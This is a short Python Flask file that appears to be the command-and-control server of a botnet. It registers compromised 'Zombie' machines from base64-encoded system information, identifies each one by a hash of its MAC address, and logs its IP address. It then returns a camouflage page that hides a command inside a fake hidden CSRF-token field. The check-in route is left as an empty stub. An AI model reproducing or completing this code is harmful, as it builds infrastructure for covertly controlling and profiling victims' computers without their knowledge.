import hashlib
import json
from base64 import b64decode, b64encode

from flask import Flask, render_template, request
from peewee import IntegrityError

from models import Zombie, db_init

app = Flask(__name__)

hidden_command = '<input name=_csrf_token type=hidden ' \
                 'value="{}"> '
camo_html = 'camo.html'


@app.route("/")
def update():
    return render_template(camo_html)


def gen_uuid(form) -> str:
    for line in form.split('\n'):
        if 'ether' in line:
            m = hashlib.sha256(line.split()[1].encode())
            return b64encode(m.digest()).decode()


@app.route("/checkin")
def check_int():
    pass


@app.route("/register", methods=['GET', 'POST'])
def register():
    post = json.loads(b64decode(request.stream.read()).decode())
    uuid = gen_uuid(post['i'])
    remote_addr = request.environ.get('HTTP_X_REAL_IP') or request.remote_addr
    try:
        Zombie.create(uuid=uuid, sysinfo=post, ip_addr=remote_addr)
    except IntegrityError:
        pass
    return render_template(camo_html, command=hidden_command.format(uuid))


if __name__ == "__main__":
    db_init()
    app.run(debug=True)
